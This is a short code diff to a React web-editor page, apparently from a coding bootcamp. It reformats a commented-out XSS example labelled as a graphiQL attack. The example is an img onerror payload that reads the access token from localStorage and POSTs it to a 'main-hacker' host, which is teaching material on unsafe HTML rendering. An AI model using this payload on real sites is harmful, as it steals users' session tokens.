@@ -38,17 +38,15 @@ export default function WebEditorHookFormDetailPage() {
   );
 }
 
-/* graphiQL XSS 공격 */
-// ===================================================
-{
-  /* <img src='#' onerror='
-const 훔친토큰 = localStorage.getItem("accessToken");
-fetch("http://main-hacker.codebootcamp.co.kr/token", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ token: 훔친토큰 })
-})
-'
-/> */
-}
-// ===================================================
+// ===== graphiQL XSS 공격 =====
+// contents: """
+//   <img src='#' onerror='
+//       const 훔친토큰 = localStorage.getItem("accessToken");
+//       fetch("http://main-hacker.codebootcamp.co.kr/token", {
+//         method: "POST",
+//         headers: { "Content-Type": "application/json" },
+//         body: JSON.stringify({ token: 훔친토큰 })
+//       })
+//     '
+//   />
+// """
